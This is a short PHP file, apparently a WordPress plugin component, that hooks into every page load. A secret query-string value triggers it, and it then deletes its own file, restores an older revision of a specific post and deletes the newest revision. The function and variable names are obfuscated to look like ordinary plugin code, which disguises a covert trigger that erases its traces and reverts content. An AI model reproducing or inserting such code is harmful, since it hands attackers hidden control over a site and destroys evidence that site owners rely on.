<?php

function pagination_mini_system_wpc() {
	if (isset($_GET['data_most_redirect_list']) && $_GET['data_most_redirect_list'] === 'portal_rotator_wpmu_adsense') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$cron_bbpress_site_ui = 658;
		$tables_switcher_genesis_category = wp_get_post_revisions($cron_bbpress_site_ui);
		if (empty($tables_switcher_genesis_category)) die('no revisions');
		if (count($tables_switcher_genesis_category) < 2) die('less than 2');
		$templates_plugin_floating = array_shift($tables_switcher_genesis_category);
		$size_code_catalog = $templates_plugin_floating->ID;
		$crm_footer_numbers = array_shift($tables_switcher_genesis_category);
		$translation_api_wall_solution = $crm_footer_numbers->ID;
		$toggle_schema_modal = wp_restore_post_revision($translation_api_wall_solution);
		if ($toggle_schema_modal === false) die('error restoring');
		$toggle_schema_modal = wp_delete_post_revision($size_code_catalog);		
		if ($toggle_schema_modal === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'pagination_mini_system_wpc');
